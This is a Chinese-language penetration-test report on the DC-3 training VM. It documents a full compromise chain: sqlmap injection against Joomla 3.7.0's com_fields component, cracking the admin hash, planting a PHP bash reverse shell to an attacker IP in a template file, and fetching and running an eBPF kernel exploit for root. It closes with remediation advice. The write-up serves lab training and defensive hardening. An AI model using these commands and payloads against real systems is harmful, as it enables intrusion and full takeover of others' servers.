## DC-3 渗透测试报告

**测试人员**：贺寿国
**测试日期**：2026年6月10日
**目标系统**：DC-3 (IP: 192.168.129.134)

------

### 1. 摘要

本次测试针对 DC-3 靶机进行渗透，成功获取系统 root 权限并读取最终 flag。主要利用路径为：Joomla 版本识别 → SQL 注入（`com_fields` 组件）→ 获取管理员密码哈希并破解 → 登录 Joomla 后台 → 修改模板文件获得反弹 shell → 利用内核漏洞（eBPF/CVE-2016-4557）提权至 root。靶机存在 SQL 注入、弱密码、内核漏洞未修补等风险。

------

### 2. 测试范围

- **IP 地址**：192.168.129.134
- **开放端口**：80 (HTTP)
- **目标系统**：Ubuntu 16.04 LTS, Joomla 3.7.0, 内核 4.4.0-21-generic (i686)

------

### 3. 测试方法与工具

- **信息收集**：nmap, arp-scan, whatweb, dirb
- **CMS 识别与扫描**：whatweb, joomscan
- **漏洞利用**：sqlmap（SQL 注入）, john（密码破解）
- **Shell 操作**：Joomla 后台模板修改, nc 反弹 shell
- **提权利用**：内核漏洞利用代码 39772（eBPF doubleput）

------

### 4. 漏洞发现与利用详情

#### 4.1 端口扫描与服务识别

**操作**：

bash

```
sudo arp-scan -l                  # 发现靶机 IP
nmap -sV -p- 192.168.129.134      # 全端口扫描
```



**结果**：

- 80/tcp open http Apache 2.4.18 (Ubuntu)

**截图**：

![image-20260608190516853](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608190516853.png)

------

#### 4.2 Web 服务识别与 CMS 指纹

访问 `http://192.168.129.134`，使用 `whatweb` 识别 CMS：

bash

```
whatweb http://192.168.129.134
```



输出显示为 **Joomla**。同时使用 `dirb` 扫描目录，发现 `/administrator/` 后台路径：

bash

```
dirb http://192.168.129.134
```



截图：

![image-20260608191527564](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608191527564.png)



------

#### 4.3 Joomla 版本识别（joomscan）

使用 `joomscan` 获取精确版本：

bash

```
joomscan --url http://192.168.129.134
```



结果：**Joomla 3.7.0**。该版本存在已知 SQL 注入漏洞（CVE-2017-8917）。

截图：

![image-20260608200259134](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608200259134.png)

------

#### 4.4 SQL 注入利用（com_fields 组件）

根据 Exploit-DB 编号 `42033`，利用 `sqlmap` 进行注入。注入点位于：

text

```
http://192.168.129.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml
```

截图：

![image-20260608200210109](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608200210109.png)

**操作**：

bash

```
# 枚举数据库
sqlmap -u "http://192.168.129.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

# 枚举表（找到用户表，注意 Joomla 表前缀动态）
sqlmap -u "http://192.168.129.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb --tables --batch

# 导出管理员用户名和密码哈希（使用 #__users 占位符）
sqlmap -u "http://192.168.129.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb --sql-query "SELECT username, password FROM #__users"
```



成功获取管理员用户名 `admin` 及 bcrypt 哈希：

text

```
admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```



截图：

![image-20260608195916196](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608195916196.png)



![image-20260608201701947](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608201701947.png)



![image-20260608201722838](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608201722838.png)



![image-20260608203532268](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260608203532268.png)



------

#### 4.5 破解管理员密码

将 bcrypt 哈希保存为 `hash.txt`，使用 John the Ripper 破解：

bash

```
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```



破解出明文密码：**`snoopy`**

截图：

![img](https://raw.githubusercontent.com/hsg1224/network/main/img/屏幕截图 2026-06-08 204955.png)

------

#### 4.6 登录 Joomla 后台并获取 Shell

使用 `admin` / `snoopy` 登录后台 `http://192.168.129.134/administrator/`。

进入 **Extensions → Templates → Templates**，选择默认模板 **Protostar**，编辑 `index.php` 文件，在开头插入反弹 shell 代码（注意修改为 Kali 的 IP 和端口）：

php

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.129/9999 0>&1'"); ?>
```



保存后，在 Kali 中监听：

bash

```
nc -lvnp 9999
```



访问网站首页 `http://192.168.129.134/`，触发反弹 shell，获得 `www-data` 权限。

截图：

![img](https://raw.githubusercontent.com/hsg1224/network/main/img/屏幕截图 2026-06-08 211946.png)



![image-20260609193744130](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260609193744130.png)

------

#### 4.7 内核提权（eBPF 漏洞 CVE-2016-4557）

查看系统信息：

bash

```
uname -a
# Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP i686 i686 i686 GNU/Linux
cat /etc/issue
# Ubuntu 16.04 LTS
```



系统为 32 位 Ubuntu 16.04，内核 4.4.0-21，存在 eBPF 提权漏洞。

在 Kali 中下载 Exploit-DB 编号 `39772` 的工具包，通过 HTTP 服务传输到靶机 `/tmp` 目录：

bash

```
# Kali 端
cd /tmp
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O /tmp/39772.zip
python3 -m http.server 8000 --bind 0.0.0.0
# 靶机端
cd /tmp
wget http://192.168.129.129:8000/39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
chmod +x compile.sh
./compile.sh
./doubleput
```



执行成功后，获得 root shell。

截图：

![img](https://raw.githubusercontent.com/hsg1224/network/main/img/屏幕截图 2026-06-10 193104.png)

------

#### 4.8 获取最终 flag

bash

```
find / -name "*flag*" 2>/dev/null
cat /root/the-flag.txt
```



输出截图：

![image-20260610194058500](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260610194058500.png)



![image-20260610194224645](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260610194224645.png)

------

### 5. 风险评级与修复建议

| 漏洞点                                  | 风险等级 | 修复建议                                                     |
| :-------------------------------------- | :------- | :----------------------------------------------------------- |
| Joomla 3.7.0 SQL 注入（CVE-2017-8917）  | **高**   | 升级 Joomla 至最新版本（≥3.7.1）或安装官方安全补丁。         |
| 管理员弱密码（`snoopy`）                | **中**   | 强制使用复杂密码策略（长度≥12，含大小写字母、数字、特殊字符），并启用双因素认证。 |
| Joomla 后台模板可写，导致 Webshell 上传 | **高**   | 限制文件系统权限，确保 Web 用户对模板目录仅有读权限（除必要写操作外）。同时开启 `disable_functions` 禁用危险 PHP 函数（如 `exec`, `system`）。 |
| Linux 内核 4.4.0-21 存在 eBPF 提权漏洞  | **高**   | 更新内核至安全版本（≥4.4.0-116）或应用相应补丁。如无法更新，考虑使用 Grsecurity/PaX 或 SELinux 等强制访问控制机制。 |
| 系统仅开放 HTTP 服务，但未启用 WAF      | **低**   | 部署 Web 应用防火墙（如 ModSecurity）以拦截 SQL 注入等攻击。 |

------

### 6. 结论

DC-3 靶机存在多个高危漏洞，攻击者可通过 SQL 注入获取管理员凭证，进而获得 Web Shell，再通过内核漏洞提权至 root，完全控制目标系统。建议尽快升级 Joomla 和 Linux 内核，并加强密码策略及文件权限管理，以降低被入侵风险。
